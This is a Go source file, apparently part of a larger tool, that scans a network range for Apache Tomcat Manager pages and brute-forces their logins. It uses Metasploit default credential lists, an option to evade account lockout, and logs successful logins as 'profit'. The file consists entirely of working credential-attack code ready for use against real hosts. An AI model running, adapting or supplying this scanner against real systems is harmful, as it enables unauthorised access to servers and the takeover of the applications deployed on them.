package main

import (
	"flag"
	"fmt"
	"log"
	"net/http"
	"strconv"
	"strings"
	"time"

	"github.com/davecgh/go-spew/spew"
)

func prettyPrintLn(logType LogType, msg string) {
	switch logType {
	case debug:
		if Debug {
			log.Printf("%s: %s\n", cyan("[D]"), msg)
		}
	case info:
		log.Printf("%s: %s\n", "[*]", msg)
	case goodnews:
		log.Printf("%s: %s\n", green("[+]"), msg)
	case badnews:
		log.Printf("%s: %s\n", yellow("[-]"), msg)
	case profit:
		log.Printf("%s: %s", green("[$]"), msg)
	case warning:
		log.Printf("%s: %s\n", yellow("[-]"), msg)
	case err:
		log.Printf("%s: %s\n", red("[X]"), msg)
	}
}

func parseCommandLineArgs() *Configuration {
	// Reading flags
	networkUnparsed := flag.String("target", "", "The target network range in CIDR notation, e.g. 10.10.10.0/24")
	portsUnparsed := flag.String("ports", "8080,8443,80,443,8000,8888", "Comma separated list of target ports.")
	managerPathUnparsed := flag.String("managerpath", "/manager/html", "Manager path.")
	goroutines := flag.Uint("concurrency", 100, "Concurrent Goroutines to use. Due to kernel limitations on linux, it should not be more than 'ulimit -n / 7'.")
	userfile := flag.String("userfile", "", "A file containing user names to test. Requires also a passfile. If neither user-, password- and userpass list is given, the default lists from Metasploit project are used.")
	passfile := flag.String("passfile", "", "A file containing passwords to test. Requires also a userfile. If neither user-, password- and userpass list is given, the default lists from Metasploit project are used.")
	userpassfile := flag.String("userpassfile", "", "A file containing username:password combinations. If neither user-, password- and userpass list is given, the default lists from Metasploit project are used.")
	timeout := flag.Duration("timeout", 2*time.Second, "HTTP timeout. Specify with unit suffix, e.g. '2500ms' or '3s'.")
	avoidLockout := flag.Bool("avoid-lockout", false, "Try to avoid lockout by waiting Tomcat's default lockout treshold between tries. Your scan may get suuuper slow, but in the end, success matters.")
	ignoreInsecure := flag.Bool("ignoreInsecure", true, "Ignore certificate errors. If you only want secure connections, set this to false.")
	flag.BoolVar(&Debug, "debug", false, "Enable debugging output.")
	flag.Parse()

	// Parsing flags
	networkIterator, e := NewNetIterator(*networkUnparsed)
	if e != nil {
		prettyPrintLn(err, e.Error())
	}
	managerPath := parseStringToManagerPath(*managerPathUnparsed)
	ports := parseStringToPorts(*portsUnparsed)
	guesses := buildGuesses(*userfile, *passfile, *userpassfile)

	// Generating config

	config := NewConfiguration(networkIterator, ports, guesses, managerPath, *goroutines, *timeout, *avoidLockout, *ignoreInsecure)

	//ips, networkSize := parseStringToNetwork(networkUnparsed, randomizeHosts)
	//ports := parseStringToPorts(portsUnparsed)
	//managerPath := parseStringToManagerPath(managerPathUnparsed)
	//sc := ScannerConfig{ips, networkSize, ports, managerPath, *goroutines, *userfile, *passfile, *userpassfile}
	//prettyPrintLn(info, fmt.Sprintf("Ports to scan: %s", strings.Trim(strings.Join(strings.Fields(fmt.Sprint(ports)), ","), "[]"))) // ",".join(ports), but with //static types... -.-
	prettyPrintLn(info, fmt.Sprintf("Manager path: %s", managerPath))
	prettyPrintLn(info, fmt.Sprintf("Debug is on: %t", Debug))
	prettyPrintLn(debug, fmt.Sprintf("Goroutines to use: %d", *goroutines))
	return config
}

func parseStringToManagerPath(rawString string) string {
	// Only basic checks to make sure building the request later creates a valid request
	if strings.HasPrefix(rawString, "/") {
		return rawString
	}
	return "/" + rawString
}

func parseStringToPorts(rawString string) []uint {
	portStringSplitted := strings.Split(rawString, ",")
	portSlice := make([]uint, 0)
	for i := 0; i < len(portStringSplitted); i++ {
		val, _ := strconv.ParseUint(portStringSplitted[i], 10, 16)
		portSlice = append(portSlice, uint(val))
	}
	return portSlice
}

// Used to track how long the execution takes
func timeTrack(start time.Time) {
	elapsed := time.Since(start)
	prettyPrintLn(info, fmt.Sprintf("Completed in %s\n", elapsed))
}

// CheckEndpoint makes sure that the application is running there and
// we do not brute force anything else
func CheckEndpoint(target string, port uint, TLS bool) {
	client := conf.HTTPClient
	var scheme string
	var responseLocationString string
	if TLS {
		scheme = "https://"
	} else {
		scheme = "http://"
	}
	if scheme == "" {
		panic("scheme is empty")
	}
	url := (scheme + target + ":" + strconv.FormatUint(uint64(port), 10) + conf.ManagerPath())
	var resp *http.Response
	var e error
	resp, e = client.Get(url)

	if e != nil {
		prettyPrintLn(debug, e.Error()) // For debugging socket issues
		return
	}
	defer resp.Body.Close()
	responseLocation, e := resp.Location()
	if e != nil {
		responseLocationString = url
	} else {
		spew.Dump(responseLocation)
		responseLocationString = responseLocation.String()
		newPort, e := strconv.ParseUint(responseLocation.Port(), 10, 32)
		if e != nil {
			prettyPrintLn(err, fmt.Sprintf("Something weird happened: %s", e.Error()))
		} else {
			prettyPrintLn(debug, fmt.Sprintf("Setting port from %d to %d", port, newPort))
			port = uint(newPort)

		}
	}

	if resp.StatusCode == http.StatusNotFound {
		prettyPrintLn(badnews, fmt.Sprintf("Manager not found (404 NotFound) at %s", responseLocationString))
	} else if resp.StatusCode == http.StatusForbidden {
		prettyPrintLn(badnews, fmt.Sprintf("Manager not found (403 Forbidden) at %s", responseLocationString))
	} else if resp.StatusCode == http.StatusUnauthorized {
		prettyPrintLn(goodnews, fmt.Sprintf("Manager found at %s", responseLocationString))
		NewBruter(target, port)
	} else if resp.StatusCode == http.StatusBadRequest && !TLS {
		CheckEndpoint(target, port, true)
	} else {
		prettyPrintLn(info, fmt.Sprintf("HTTP %d without authentication at %s", resp.StatusCode, responseLocationString))
	}
}

// BruteEndpoint is the function that performs the actual guessing
func BruteEndpoint(target string, port uint, TLS bool, guess Guess) {
	client := conf.HTTPClient
	var scheme string
	if TLS {
		scheme = "https://"
	} else {
		scheme = "http://"
	}
	url := (scheme + target + ":" + strconv.FormatUint(uint64(port), 10) + conf.ManagerPath())
	prettyPrintLn(debug, fmt.Sprintf("Trying %s:%s against %s", guess.username, guess.password, url))
	req, e := http.NewRequest("GET", url, nil)
	if e != nil {
		prettyPrintLn(debug, fmt.Sprintf("Error (%s) when creating request for %s", e.Error(), url))
	}
	req.SetBasicAuth(guess.username, guess.password)
	resp, e := client.Do(req)
	if e != nil {
		prettyPrintLn(debug, fmt.Sprintf("%s when trying %s:%s against %s", e.Error(), guess.username, guess.password, url))
		return
	}
	if resp.StatusCode == http.StatusBadRequest && !TLS {
		BruteEndpoint(target, port, true, guess)
	} else if resp.StatusCode == http.StatusOK {
		prettyPrintLn(profit, fmt.Sprintf("Success! %s:%s on %s", guess.username, guess.password, url))
	}
}
